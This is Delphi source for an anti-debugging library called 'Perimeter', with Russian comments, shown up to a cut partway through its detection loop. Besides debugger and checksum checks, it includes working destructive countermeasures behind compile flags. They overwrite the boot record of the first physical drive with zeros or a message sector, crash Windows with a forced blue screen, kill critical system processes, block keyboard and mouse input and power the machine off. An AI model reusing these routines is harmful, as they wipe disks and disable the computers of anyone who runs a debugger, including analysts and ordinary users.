unit Perimeter;

interface

//{$DEFINE SOUNDS}
//{$DEFINE USER_LOCK}
//{$DEFINE KERNEL_SUPPORT}
//{$DEFINE HARDCORE_MODE}
//{$DEFINE ACTIVATE_DEBUG_PRIVILEGE}
//{$DEFINE ACTIVATE_SHUTDOWN_PRIVILEGE}

uses
  Windows,
  SysUtils,
  TlHelp32
  {$IFDEF SOUNDS}, MMSystem{$ENDIF};

  
const
  PERIMETER_MESSAGE_NUMBER = $FFF;


// Информация об антиотладочных функциях (True - функция нашла отладчик):
type
  TAntiDebugFunctions = record
    ASM_A    : Boolean;
    ASM_B    : Boolean;
    IDP      : Boolean;
    RDP      : Boolean;
    ODS      : Boolean;
    ZwQIP    : Boolean;
    ZwQSI    : Boolean;
    ZwClose  : Boolean;
    External : Boolean;
  end;

// Выходные параметры:
type
  TPerimeterInfo = record
    PrivilegesActivated : Boolean;  // Привилегии установлены
    Checksum            : LongWord; // Текущая контрольная сумма
    DebuggerExists      : Boolean;  // Найден отладчик
    BreakpointExists    : Boolean;  // Найден брейкпоинт
    ROMFailure          : Boolean;  // Неверная контрольная сумма
    DebuggerEmulation   : Boolean;  // Эмуляция отладчика
    BreakpointEmulation : Boolean;  // Эмуляция брейкпоинта
    ElapsedTime         : Single;   // Время, затраченное на один такт
    Functions           : TAntiDebugFunctions; // Информация о каждой антиотладочной функции
  end;

// Входные параметры:
type
  TPerimeterSettings = record
    CheckingsType          : LongWord; // Тип проверок (например, ASM_A or ZwSIT)
    ResistanceType         : LongWord; // Тип противодействия (например, Notify)
    // Внешнее событие при проверке (nil - отключено):
    OnChecking             : function(PerimeterInfo: TPerimeterInfo): Boolean;
    // Внешнее событие при найденном отладчике (nil - отключено):
    OnDebuggerFound        : procedure(PerimeterInfo: TPerimeterInfo);
    MessagesReceiverHandle : THandle;  // Хэндл, получающий сообщения
    MessageNumber          : LongWord; // Номер сообщения, отправляемого хэндлу
    Interval               : THandle;  // Интервал между сканированием
  end;

var
  PerimeterCRC: LongWord = $00000000;

// Константы-идентификаторы проверок:
const
  LazyROM   = 1;
  ROM       = 2;
  ASM_A     = 4;
  ASM_B     = 8;
  IDP       = 16;
  RDP       = 32;
  ODS       = 64;   // Результат OutputDebugString - НЕНАДЁЖНО!!!
  WINAPI_BP = 128;
  ZwSIT     = 256;  // Отключение от отладчика
  ZwQIP     = 512;
  ZwQSI     = 1024; // Только Kernel-Mode отладчики
  ZwClose   = 2048; // Обработка ядерного исключения

// Константы механизма противодействия:
const
  Nothing           = 0;
  ShutdownProcess   = 1;
  Notify            = 2;
{$IFDEF USER_LOCK}
  BlockIO           = 4;
{$ENDIF}
{$IFDEF KERNEL_SUPPORT}
  ShutdownPrimary   = 8;
  ShutdownSecondary = 16;
  GenerateBSOD      = 32;
  HardBSOD          = 64;
{$ENDIF}
{$IFDEF HARDCORE_MODE}
  DestroyMBR        = 128;
  ReplaceMBR        = 256;
{$ENDIF}

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

// Константы для _Notify:
const
  MESSAGE_UNKNOWN     = 0;
  MESSAGE_DEBUGGER    = 1;
  MESSAGE_BREAKPOINT  = 2;
  MESSAGE_ROM_FAILURE = 3;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

// Константы для PostMessage:
const
  PM_START      = $FF;
  PM_STOP       = $00;
  DB_EXISTS     = $FD;
  DB_NOT_EXISTS = $0D;
  DB_EMULATE    = $ED;
  BP_EXISTS     = $FB;
  BP_NOT_EXISTS = $0B;
  BP_EMULATE    = $EB;

{
  wParam - информация об отладчике
  lParam - информация о брейкпоинтах
}


// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

const
  MaximumRunTime: Single = 1.5; // Максимальное время выполнения одного цикла

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

// Запуск и остановка защиты:
function StartPerimeter(const PerimeterStartupData: TPerimeterSettings): Boolean;
procedure StopPerimeter;

// Расчёт CRC32:
procedure CRCInit;
function CRC32(InitCRC32: Cardinal; Buffer: Pointer; Size: Cardinal): Cardinal;

// Служебные функции - установка привилегий и завершение процессов:
function NTSetPrivilege(Privilege: string; Enabled: Boolean = True): Boolean;
function KillTask(ExeFileName: string): Integer;

// Функции противодействия:
procedure _ShutdownProcess; inline;
procedure _Notify(Handle: THandle = 0; MessageType: Byte = 0); inline;
{$IFDEF USER_LOCK}
procedure _BlockIO(Status: LongBool); inline;
{$ENDIF}
{$IFDEF KERNEL_SUPPORT}
procedure _ShutdownPrimary; inline;
procedure _ShutdownSecondary; inline;
procedure _GenerateBSOD(HardErrorCode: LongWord = 0); inline;
procedure _HardBSOD; inline;
{$ENDIF}
{$IFDEF HARDCORE_MODE}
procedure _DestroyMBR(ReplaceMBR: Boolean = False); inline;
{$ENDIF}

// Функции для управления Периметром:
function CalculatePerimeterCRC: LongWord;
function GetPerimeterInfo: TPerimeterInfo;
function GetPerimeterSettings: TPerimeterSettings;
procedure SetPerimeterSettings(NewPerimeterSettings: TPerimeterSettings);
function GeneratePerimeterSettings(
{=================================} CheckingsType: LongWord = ROM       or
{       Welcome to the Matrix                                }LazyROM   or
{                                      Everything that       }ASM_A     or
{     o              o                 has a beginning       }ASM_B     or
{  =/+-----         =+\                has an end, Neo (c)   }IDP       or
{  _//_______________/\___                                   }RDP       or
{ |                       | |\__                             }WINAPI_BP or
{ |  HoShiMin Production  | | |o\_                           }ZwSIT     or
{ |_______________________|=|_|__|)         _o               }ZwQIP     or
{ /(@@)(@@)\        /(@@)\  |/(@@)        o\+o\              }ZwQSI     or
{============================================================}ZwClose;
{                                 } ResistanceType: LongWord = Notify;
{      _____(**)_                 } MessagesReceiverHandle: THandle = 0;
{   __/_|___|_O_\_____            } MessageNumber: LongWord = PERIMETER_MESSAGE_NUMBER;
{  /_(QQ)\_POLICE/(Q)_\           } Interval: LongWord = 20
{=================================}): TPerimeterSettings;
procedure ChangeSettings(CheckingsType: LongWord; ResistanceType: LongWord);
procedure Emulate(Debugger: Boolean; Breakpoint: Boolean);
procedure ChangeImageSize(NewSize: LongWord);
procedure ErasePEHeader;


//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH


// Объявление типов из NTDDK:
type
  POWER_ACTION       = LongWord;
  SYSTEM_POWER_STATE = LongWord;
  NTSTATUS           = LongWord;
  PVOID              = Pointer;

// Список параметров для первого способа выключения питания:
type
  SHUTDOWN_ACTION = (
                      ShutdownNoReboot,
                      ShutdownReboot,
                      ShutdownPowerOff
                     );


// Список ВХОДНЫХ опций для функции BSOD'a: для генерации синего экрана
// нужна последняя (OptionShutdownSystem). Если в вызове функции указать не её, а другую -
// будет сгенерирован MessageBox с сообщением об ошибке, код которой
// будет указан первым параметром этой функции.
type
  HARDERROR_RESPONSE_OPTION = (
                                OptionAbortRetryIgnore,
                                OptionOk,
                                OptionOkCancel,
                                OptionRetryCancel,
                                OptionYesNo,
                                OptionYesNoCancel,
                                OptionShutdownSystem
                               );

// Список ВЫХОДНЫХ опций для функции BSOD'a:
type
  HARDERROR_RESPONSE = (
                         ResponseReturnToCaller,
                         ResponseNotHandled,
                         ResponseAbort,
                         ResponseCancel,
                         ResponseIgnore,
                         ResponseNo,
                         ResponseOk,
                         ResponseRetry,
                         ResponseYes
                        );

type
  THREAD_INFORMATION_CLASS = (
                               ThreadBasicInformation,
                               ThreadTimes,
                               ThreadPriority,
                               ThreadBasePriority,
                               ThreadAffinityMask,
                               ThreadImpersonationToken,
                               ThreadDescriptorTableEntry,
                               ThreadEnableAlignmentFaultFixup,
                               ThreadEventPair,
                               ThreadQuerySetWin32StartAddress,
                               ThreadZeroTlsCell,
                               ThreadPerformanceCount,
                               ThreadAmILastThread,
                               ThreadIdealProcessor,
                               ThreadPriorityBoost,
                               ThreadSetTlsArrayAddress,
                               ThreadIsIoPending,
                               ThreadHideFromDebugger
                              );

  PROCESS_INFORMATION_CLASS = (
                                ProcessBasicInformation,
                                ProcessQuotaLimits,
                                ProcessIoCounters,
                                ProcessVmCounters,
                                ProcessTimes,
                                ProcessBasePriority,
                                ProcessRaisePriority,
                                ProcessDebugPort,
                                ProcessExceptionPort,
                                ProcessAccessToken,
                                ProcessLdtInformation,
                                ProcessLdtSize,
                                ProcessDefaultHardErrorMode,
                                ProcessIoPortHandlers,
                                ProcessPooledUsageAndLimits,
                                ProcessWorkingSetWatch,
                                ProcessUserModeIOPL,
                                ProcessEnableAlignmentFaultFixup,
                                ProcessPriorityClass,
                                ProcessWx86Information,
                                ProcessHandleCount,
                                ProcessAffinityMask,
                                ProcessPriorityBoost,
                                ProcessDeviceMap,
                                ProcessSessionInformation,
                                ProcessForegroundInformation,
                                ProcessWow64Information,
                                ProcessImageFileName,
                                ProcessLUIDDeviceMapsEnabled,
                                ProcessBreakOnTermination,
                                ProcessDebugObjectHandle,
                                ProcessDebugFlags,
                                ProcessHandleTracing,
                                ProcessIoPriority,
                                ProcessExecuteFlags,
                                ProcessTlsInformation,
                                ProcessCookie,
                                ProcessImageInformation,
                                ProcessCycleTime,
                                ProcessPagePriority,
                                ProcessInstrumentationCallback,
                                ProcessThreadStackAllocation,
                                ProcessWorkingSetWatchEx,
                                ProcessImageFileNameWin32,
                                ProcessImageFileMapping,
                                ProcessAffinityUpdateMode,
                                ProcessMemoryAllocationMode,
                                ProcessGroupInformation,
                                ProcessTokenVirtualizationEnabled,
                                ProcessOwnerInformation,
                                ProcessWindowInformation,
                                ProcessHandleInformation,
                                ProcessMitigationPolicy,
                                ProcessDynamicFunctionTableInformation,
                                ProcessHandleCheckingMode,
                                ProcessKeepAliveCount,
                                ProcessRevokeFileHandles,
                                ProcessWorkingSetControl,
                                ProcessHandleTable,
                                ProcessCheckStackExtentsMode,
                                ProcessCommandLineInformation,
                                ProcessProtectionInformation,
                                MaxProcessInfoClass
                               );

  SYSTEM_INFORMATION_CLASS = (
                               SystemBasicInformation,
                               SystemProcessorInformation,
                               SystemPerformanceInformation,
                               SystemTimeOfDayInformation,
                               SystemPathInformation,
                               SystemProcessInformation,
                               SystemCallCountInformation,
                               SystemDeviceInformation,
                               SystemProcessorPerformanceInformation,
                               SystemFlagsInformation,
                               SystemCallTimeInformation,
                               SystemModuleInformation,
                               SystemLocksInformation,
                               SystemStackTraceInformation,
                               SystemPagedPoolInformation,
                               SystemNonPagedPoolInformation,
                               SystemHandleInformation,
                               SystemObjectInformation,
                               SystemPageFileInformation,
                               SystemVdmInstemulInformation,
                               SystemVdmBopInformation,
                               SystemFileCacheInformation,
                               SystemPoolTagInformation,
                               SystemInterruptInformation,
                               SystemDpcBehaviorInformation,
                               SystemFullMemoryInformation,
                               SystemLoadGdiDriverInformation,
                               SystemUnloadGdiDriverInformation,
                               SystemTimeAdjustmentInformation,
                               SystemSummaryMemoryInformation,
                               SystemMirrorMemoryInformation,
                               SystemPerformanceTraceInformation,
                               SystemObsolete0,
                               SystemExceptionInformation,
                               SystemCrashDumpStateInformation,
                               SystemKernelDebuggerInformation
                              );

  SYSTEM_KERNEL_DEBUGGER_INFORMATION = record
    DebuggerEnabled: Boolean;
    DebuggerNotPresent: Boolean;
  end;

// Номера критических ошибок для генерации BSOD'a:
const
  TRUST_FAILURE                    = $C0000250;
  LOGON_FAILURE                    = $C000006C;
  HOST_DOWN                        = $C0000350;
  FAILED_DRIVER_ENTRY              = $C0000365;
  NT_SERVER_UNAVAILABLE            = $C0020017;
  NT_CALL_FAILED                   = $C002001B;
  CLUSTER_POISONED                 = $C0130017;
  FATAL_UNHANDLED_HARD_ERROR       = $0000004C;
  STATUS_SYSTEM_PROCESS_TERMINATED = $C000021A;

// ntdll.dll:

// Завершение процесса:
procedure LdrShutdownProcess; stdcall; external 'ntdll.dll';
function ZwTerminateProcess(Handle: LongWord; ExitStatus: LongWord): NTStatus; stdcall; external 'ntdll.dll';


{$IFDEF KERNEL_SUPPORT}
// 1й способ отключения питания:
function ZwShutdownSystem(Action: SHUTDOWN_ACTION): NTSTATUS; stdcall; external 'ntdll.dll';

// 2й способ отключения питания:
function ZwInitiatePowerAction (
                                 SystemAction: POWER_ACTION;
                                 MinSystemState: SYSTEM_POWER_STATE;
                                 Flags: ULONG;
                                 Asynchronous: BOOL
                                ): NTSTATUS; stdcall; external 'ntdll.dll';

// BSOD:
function ZwRaiseHardError(
                           ErrorStatus: NTSTATUS;
                           NumberOfParameters: ULONG;
                           UnicodeStringParameterMask: PChar;
                           Parameters: PVOID;
                           ResponseOption: HARDERROR_RESPONSE_OPTION;
                           PHardError_Response: Pointer
                          ): NTSTATUS; stdcall; external 'ntdll.dll';
{$ENDIF}

function ZwQueryInformationProcess(
                                    ProcessHandle: THANDLE;
                                    ProcessInformationClass: PROCESS_INFORMATION_CLASS;
                                    ProcessInformation: PVOID;
                                    ProcessInformationLength: ULONG;
                                    ReturnLength: PULONG
                                   ): NTSTATUS; stdcall; external 'ntdll.dll';

function ZwQuerySystemInformation(
                                   SystemInformationClass: SYSTEM_INFORMATION_CLASS;
                                   SystemInformation: PVOID;
                                   SystemInformationLength: ULONG;
                                   ReturnedLength: PULONG
                                  ): NTSTATUS; stdcall; external 'ntdll.dll';

function ZwSetInformationThread(
                                 ThreadHandle: THANDLE;
                                 ThreadInformationClass: THREAD_INFORMATION_CLASS;
                                 ThreadInformation: PVOID;
                                 ThreadInformationLength: ULONG
                                ): NTSTATUS; stdcall; external 'ntdll.dll';


// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

// kernel32:
function IsDebuggerPresent: Boolean; stdcall; external 'kernel32.dll';
function CheckRemoteDebuggerPresent(Handle: THandle; out RemoteDebuggerPresent: LongBool): LongBool; stdcall; external 'kernel32.dll';

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

{$IFDEF USER_LOCK}
// user32.dll:
function BlockInput(Status: LongBool): LongBool; stdcall; external 'user32.dll';
{$ENDIF}

//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH

const
  SystemProcesses: array [0..3] of string = (
                                              'smss.exe',
                                              'csrss.exe',
                                              'wininit.exe',
                                              'winlogon.exe'
                                                              );

  ErrorCode: array [0..8] of LongWord = (
                                          TRUST_FAILURE,
                                          LOGON_FAILURE,
                                          HOST_DOWN,
                                          FAILED_DRIVER_ENTRY,
                                          NT_SERVER_UNAVAILABLE,
                                          NT_CALL_FAILED,
                                          CLUSTER_POISONED,
                                          FATAL_UNHANDLED_HARD_ERROR,
                                          STATUS_SYSTEM_PROCESS_TERMINATED
                                         );

{$IFDEF HARDCORE_MODE}
  BootFile: array [0..511] of byte = (
	$B4, $09, $BA, $1A, $01, $CD, $21, $B0, $B6, $B8, $FF, $FF, $E7, $43, $B8, $90,
	$1F, $E7, $42, $E5, $61, $0C, $03, $E6, $61, $C3, $0D, $0A, $20, $20, $20, $20,
	$20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20,
	$20, $48, $0D, $0A, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20,
	$20, $20, $20, $20, $20, $20, $20, $20, $48, $20, $48, $0D, $0A, $20, $20, $20,
	$20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20,
	$48, $20, $20, $20, $48, $0D, $0A, $20, $20, $20, $20, $20, $20, $20, $20, $20,
	$20, $20, $20, $20, $20, $20, $20, $20, $20, $48, $20, $20, $20, $20, $20, $48,
	$0D, $0A, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20,
	$20, $20, $20, $48, $20, $20, $20, $20, $20, $20, $20, $48, $0D, $0A, $20, $20,
	$20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $48, $20,
	$20, $20, $20, $49, $20, $20, $20, $20, $48, $0D, $0A, $20, $20, $20, $20, $20,
	$20, $20, $20, $20, $20, $20, $20, $20, $20, $20, $48, $20, $20, $20, $20, $49,
	$48, $49, $20, $20, $20, $20, $48, $0D, $0A, $20, $20, $20, $20, $20, $20, $20,
	$20, $20, $20, $20, $20, $20, $20, $48, $20, $20, $20, $20, $49, $48, $48, $48,
	$49, $20, $20, $20, $20, $48, $0D, $0A, $20, $20, $20, $20, $20, $20, $20, $20,
	$20, $20, $20, $20, $20, $48, $20, $20, $20, $20, $20, $20, $20, $48, $20, $20,
	$20, $20, $20, $20, $20, $48, $0D, $0A, $20, $20, $20, $20, $20, $20, $20, $20,
	$20, $20, $20, $20, $48, $20, $20, $20, $20, $20, $20, $20, $20, $48, $20, $20,
	$20, $20, $20, $20, $20, $20, $48, $0D, $0A, $20, $20, $20, $20, $20, $20, $20,
	$20, $20, $20, $20, $48, $20, $48, $20, $48, $20, $48, $20, $48, $20, $48, $20,
	$48, $20, $48, $20, $48, $20, $48, $20, $48, $0D, $0A, $0D, $0A, $22, $50, $65,
	$72, $69, $6D, $65, $74, $65, $72, $22, $20, $4C, $6F, $77, $2D, $4C, $65, $76,
	$65, $6C, $20, $44, $65, $66, $65, $6E, $63, $65, $20, $53, $79, $73, $74, $65,
	$6D, $20, $64, $65, $6C, $65, $74, $65, $64, $0D, $0A, $79, $6F, $75, $72, $20,
	$62, $6F, $6F, $74, $2D, $73, $70, $61, $63, $65, $20, $61, $6E, $64, $20, $74,
	$61, $62, $6C, $65, $20, $6F, $66, $20, $64, $72, $69, $76, $65, $73, $0D, $0A,
	$64, $75, $65, $20, $74, $6F, $20, $70, $72, $6F, $74, $65, $63, $74, $20, $73,
	$65, $6C, $66, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $66, $72, $6F, $6D,
	$20, $64, $65, $62, $75, $67, $67, $69, $6E, $67, $21, $0D, $0A, $0D, $0A, $59,
	$6F, $75, $20, $73, $68, $6F, $75, $6C, $64, $20, $72, $65, $69, $6E, $73, $74,
	$61, $6C, $6C, $20, $79, $6F, $75, $72, $20, $4F, $53, $2E, $0D, $0A, $24, $00
);
{$ENDIF}

//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH

{$IFDEF SOUNDS}
  {$R SOUNDS.RES}
{$ENDIF}


implementation

var
  PerimeterSettings : TPerimeterSettings;
  PerimeterInfo     : TPerimeterInfo;
  Active            : Boolean = False;
  EmulateDebugger   : Boolean = False;
  EmulateBreakpoint : Boolean = False;

//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH

var
  CRCTable: array [0..255] of Cardinal;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

function CRC32(InitCRC32: Cardinal; Buffer: Pointer; Size: Cardinal): Cardinal;
asm
  test edx, edx
  jz @Ret
  neg ecx
  jz @Ret
  sub edx, ecx
  push ebx
  xor ebx, ebx
@Next:
  mov bl, al
  xor bl, byte [edx + ecx]
  shr eax, 8
  xor eax, dword [CRCTable + ebx * 4]
  inc ecx
  jnz @Next
  pop ebx
  xor eax, $FFFFFFFF
@Ret:
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure CRCInit;
var
  C: Cardinal;
  I, J: Integer;
begin
  for I := 0 to 255 do
  begin
    C := I;
    for J := 1 to 8 do
      if Odd(C) then
        C := (C shr 1) xor $EDB88320
      else
        C := (C shr 1);
    CRCTable[I] := C;
  end;
end;


//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH


// Установка привилегий
function NTSetPrivilege(Privilege: string; Enabled: Boolean = True): Boolean;
var
  hToken: THandle;
  TokenPriv: TOKEN_PRIVILEGES;
  PrevTokenPriv: TOKEN_PRIVILEGES;
  ReturnLength: Cardinal;
begin
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, hToken) then
  begin
    if LookupPrivilegeValue(nil, PChar(Privilege), TokenPriv.Privileges[0].Luid) then
    begin
      TokenPriv.PrivilegeCount := 1;
      case Enabled of
        True: TokenPriv.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
        False: TokenPriv.Privileges[0].Attributes := 0;
      end;
      ReturnLength := 0;
      PrevTokenPriv := TokenPriv;
      AdjustTokenPrivileges(hToken, False, TokenPriv, SizeOf(PrevTokenPriv),
      PrevTokenPriv, ReturnLength);
    end;
    CloseHandle(hToken);
  end;
  Result := GetLastError = ERROR_SUCCESS;
end;


//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH


function KillTask(ExeFileName: string): Integer;
var
  Status: BOOL;
  ToolHelpHandle: THandle;
  ProcessEntry: TProcessEntry32;
begin
  Result := 0;
  ToolHelpHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
  ProcessEntry.dwSize := Sizeof(ProcessEntry);
  Status := Process32First(ToolHelpHandle,ProcessEntry);

  while integer(Status) <> 0 do
  begin
    if
      ((UpperCase(ExtractFileName(ProcessEntry.szExeFile)) = UpperCase(ExeFileName))
    or
      (UpperCase(ProcessEntry.szExeFile) = UpperCase(ExeFileName)))
    then
      Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID), 0));
    Status := Process32Next(ToolHelpHandle, ProcessEntry);
  end;
  CloseHandle(ToolHelpHandle);
end;


//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH


procedure _ShutdownProcess; inline;
begin
  LdrShutdownProcess;
  ZwTerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, GetCurrentProcessId), 0);
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure _Notify(Handle: THandle = 0; MessageType: Byte = 0); inline;
begin
  {$IFDEF SOUNDS}
  PlaySound('ALERT', 0, SND_RESOURCE or SND_ASYNC or SND_LOOP);
  {$ENDIF}

  case MessageType of
    MESSAGE_UNKNOWN:     MessageBox(Handle, 'Внутренняя ошибка! Продолжение невозможно!', 'Угроза внутренней безопасности!', MB_ICONERROR);
    MESSAGE_DEBUGGER:    MessageBox(Handle, 'Обнаружен отладчик! Продолжение невозможно!', 'Угроза внутренней безопасности!', MB_ICONERROR);
    MESSAGE_BREAKPOINT:  MessageBox(Handle, 'Обнаружен брейкпоинт! Продолжение невозможно!', 'Угроза внутренней безопасности!', MB_ICONERROR);
    MESSAGE_ROM_FAILURE: MessageBox(Handle, 'Несоответствие контрольных сумм! Продолжение невозможно!', 'Угроза внутренней безопасности!', MB_ICONERROR);
  end;

  _ShutdownProcess;
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

{$IFDEF USER_LOCK}
procedure _BlockIO(Status: LongBool); inline;
begin
  BlockInput(Status);
end;
{$ENDIF}

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

{$IFDEF KERNEL_SUPPORT}

procedure _ShutdownPrimary; inline;
begin
  ZwShutdownSystem(SHUTDOWN_ACTION(0));
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure _ShutdownSecondary; inline;
begin
  ZwInitiatePowerAction(4, 6, 0, TRUE);
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure _GenerateBSOD(HardErrorCode: LongWord = 0); inline;
var
  HR: HARDERROR_RESPONSE;
begin
  if HardErrorCode = 0 then
    ZwRaiseHardError(HOST_DOWN, 0, nil, nil, HARDERROR_RESPONSE_OPTION(6), @HR)
  else
    ZwRaiseHardError(HardErrorCode, 0, nil, nil, HARDERROR_RESPONSE_OPTION(6), @HR);
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure _HardBSOD; inline;
var
  I: LongWord;
  ProcessesCount: LongWord;
begin
  ProcessesCount := Length(SystemProcesses) - 1;
  for I := 0 to ProcessesCount do KillTask(SystemProcesses[I]);
end;

{$ENDIF}

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

{$IFDEF HARDCORE_MODE}
procedure _DestroyMBR(ReplaceMBR: Boolean = False); inline;
var
  hDrive: THandle;
  Data: Pointer;
  WrittenBytes: LongWord;
begin
  hDrive := CreateFile('\\.\PhysicalDrive0', GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

  if ReplaceMBR then
  begin
    WriteFile(hDrive, BootFile, 512, WrittenBytes, nil);
  end
  else
  begin
    GetMem(Data, 512);
    FillChar(Data^, 512, #0);
    WriteFile(hDrive, Data^, 512, WrittenBytes, nil);
    FreeMem(Data);
  end;

  CloseHandle(hDrive);
end;
{$ENDIF}

//HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH

function IsNumberContains(Number, SubNumber: LongWord): Boolean; inline;
begin
  Result := (Number and SubNumber) = SubNumber;
end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

procedure PerimeterThread;

  // Функция противодействия:
  procedure EliminateThreat; inline;
  begin
    with PerimeterSettings do
    begin
      if @OnDebuggerFound <> nil then OnDebuggerFound(PerimeterInfo);

      if IsNumberContains(ResistanceType, ShutdownProcess) then
        _ShutdownProcess;

      if IsNumberContains(ResistanceType, Notify) then
      begin
        if PerimeterInfo.DebuggerExists then
          _Notify(PerimeterSettings.MessagesReceiverHandle, MESSAGE_DEBUGGER);

        if PerimeterInfo.BreakpointExists then
          _Notify(PerimeterSettings.MessagesReceiverHandle, MESSAGE_BREAKPOINT);

        if PerimeterInfo.ROMFailure then
          _Notify(PerimeterSettings.MessagesReceiverHandle, MESSAGE_ROM_FAILURE);

        _Notify(PerimeterSettings.MessagesReceiverHandle, MESSAGE_UNKNOWN);
      end;

{$IFDEF USER_LOCK}
      if IsNumberContains(ResistanceType, BlockIO) then
        _BlockIO(True);
{$ENDIF}

{$IFDEF KERNEL_SUPPORT}
      if IsNumberContains(ResistanceType, ShutdownPrimary) then
        _ShutdownPrimary;

      if IsNumberContains(ResistanceType, ShutdownSecondary) then
        _ShutdownSecondary;

      if IsNumberContains(ResistanceType, GenerateBSOD) then
        _GenerateBSOD(Random(Length(ErrorCode) - 1));

      if IsNumberContains(ResistanceType, HardBSOD) then
        _HardBSOD;
{$ENDIF}

{$IFDEF HARDCORE_MODE}
      if IsNumberContains(ResistanceType, DestroyMBR) then
        _DestroyMBR;
{$ENDIF}
    end;
  end;

var
  AsmFunctionValue: LongWord;
  RemoteDebugger: LongBool;
  DebugPort: THandle;
  NoDebugInherit: LongBool;
  DebugObjectHandle: THandle;
  KernelDebuggerInfo: SYSTEM_KERNEL_DEBUGGER_INFORMATION;
  T1, T2, iCounterPerSec: Int64;
  DebuggerState, BreakpointState: LongWord;
const
  DebugString: PChar = 'СЗПУ "Периметр" :: Веха #1';
begin
  // Посылаем сообщение о запуске Периметра:
  PostMessage(PerimeterSettings.MessagesReceiverHandle, PerimeterSettings.MessageNumber, PM_START, PM_START);

  while Active do
  begin
    // Чистим структуру с информацией:
    FillChar(PerimeterInfo, SizeOf(PerimeterInfo), #0);
    DebuggerState   := $0D;
    BreakpointState := $0B;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // Засекаем время:
    QueryPerformanceFrequency(iCounterPerSec);
    QueryPerformanceCounter(T1);

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // Эмуляция отладчика:
    if EmulateDebugger then
    begin
      PerimeterInfo.DebuggerExists := True;
      PerimeterInfo.DebuggerEmulation := True;
      EliminateThreat;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // Эмуляция брейкпоинта:
    if EmulateBreakpoint then
    begin
      PerimeterInfo.BreakpointExists := True;
      PerimeterInfo.BreakpointEmulation := True;
      EliminateThreat;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // Проверяем CRC:
    if IsNumberContains(PerimeterSettings.CheckingsType, ROM) then
    begin
      PerimeterInfo.Checksum := CalculatePerimeterCRC;
      if PerimeterInfo.Checksum <> PerimeterCRC then
      begin
        PerimeterInfo.ROMFailure := True;
        EliminateThreat;
      end;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // IDP:
    if IsNumberContains(PerimeterSettings.CheckingsType, IDP) then
    begin
      if IsDebuggerPresent then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.IDP := True;
        EliminateThreat;
      end;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // RDP:
    if IsNumberContains(PerimeterSettings.CheckingsType, RDP) then
    begin
      CheckRemoteDebuggerPresent(GetCurrentProcess, RemoteDebugger);
      if RemoteDebugger then
      begin
        PerimeterInfo.DebuggerExists := True;
        PerimeterInfo.Functions.RDP := True;
        EliminateThreat;
      end;
    end;

// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    // ODS:
    if IsNumberContains(PerimeterSettings.CheckingsType, ODS) then
    begin
